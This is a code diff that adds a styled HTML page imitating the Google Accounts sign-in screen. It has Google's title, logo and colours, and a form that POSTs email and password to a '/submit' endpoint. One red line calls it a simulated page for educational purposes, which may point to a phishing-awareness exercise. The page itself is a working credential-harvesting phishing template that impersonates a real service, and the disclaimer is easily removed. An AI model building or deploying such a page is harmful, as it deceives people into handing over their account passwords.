@@ -2,9 +2,84 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 360px;
+            width: 100%;
+            padding: 24px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .google-logo img {
+            width: 75px;
+            margin-bottom: 16px;
+        }
+        .title {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px;
+            font-size: 14px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #1764c4;
+        }
+        .disclaimer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: red;
+        }
+    </style>
 </head>
 <body>
-
+    <div class="container">
+        <div class="google-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+        </div>
+        <div class="title">Sign in</div>
+        <div class="subtitle">Use your Google Account</div>
+        <form method="POST" action="/submit">
+            <input type="text" name="username" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <button class="button" type="submit">Sign in</button>
+        </form>
+        <div class="disclaimer">
+            This is a simulated page for educational purposes only.
+        </div>
+    </div>
 </body>
 </html>
